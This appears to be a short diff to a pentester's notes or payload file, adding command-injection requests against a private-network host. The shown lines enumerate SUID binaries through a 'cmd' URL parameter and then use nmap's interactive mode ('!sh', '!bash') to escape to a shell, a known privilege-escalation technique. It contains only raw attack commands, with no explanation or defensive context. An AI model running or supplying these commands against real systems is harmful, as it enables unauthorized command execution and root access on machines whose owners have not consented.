@@ -13,3 +13,8 @@ http://192.168.1.1/test?cmd=find%20/%20-perm%20-4000%202>/dev/null
 ?cmd=/usr/local/bin/nmap --version
 ?cmd=echo "id" | /usr/local/bin/nmap --interactive
 ?cmd=echo "!sh" | /usr/local/bin/nmap --interactive
+
+http://192.168.1.1/test?cmd=printf%20"!sh\n"%20|%20/usr/local/bin/nmap%20--interactive
+!bash
+nmap --interactive
+!sh
